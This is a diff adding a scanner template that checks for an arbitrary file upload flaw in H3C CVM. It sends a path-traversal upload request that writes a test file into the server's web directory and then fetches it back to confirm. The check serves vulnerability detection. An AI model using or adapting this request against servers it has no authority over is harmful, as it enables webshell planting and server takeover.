@@ -1,0 +1,40 @@
+id: h3c-cvm-fileupload
+
+info:
+  name: H3C CVM 前台任意文件上传漏洞
+  author: daffainfo
+  severity: critical
+  verified: true
+  description: |-
+    H3C公司依托其强大的技术实力、产品与服务优势，以及深入人心的以客户为中心的理念，为企业数据中心IaaS云计算基础架构提供最优化的虚拟化与云业务运营解决方案。通过H3CCASCVM虚拟化管理系统实现数据中心虚拟化环境的中央管理控制，以简洁的管理界面，统一管理数据中心内所有的物理资源和虚拟资源，不仅能提高管理员的管控能力、简化日常例行工作，更可降低IT环境的复杂度和管理成本。H3CCVM存在任意文件上传漏洞，攻击者可以上传任意文件，获取webshell，控制服务器权限，读取敏感信息等。
+    fofa: server="H3C-CVM"
+  tags: h3c,cvm,fileupload
+  created: 2023/07/25
+
+set:
+  baseurl: request.url
+  r1: randomLowercase(8)
+  r2: md5(r1)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/{{r1}}.txt&name=222
+      headers:
+        Content-Range: "bytes 0-110/120"
+        Referer: "{{baseurl}}/cas/login"
+        Accept-Encoding: "gzip, deflate"
+        Content-Type: ""
+      body: "{{r2}}"
+    expression: response.status == 200 && response.body.bcontains(b'message') && response.body.bcontains(b'success') && response.body.bcontains(b'true')
+  r1:
+    request:
+      method: GET
+      path: /cas/js/lib/buttons/{{r1}}.txt
+      headers:
+        Content-Range: "bytes 0-110/120"
+        Referer: "{{baseurl}}/cas/login"
+        Accept-Encoding: "gzip, deflate"
+        Content-Type: ""
+    expression: response.status == 200 && response.body.bcontains(bytes(r2))
+expression: r0() && r1()
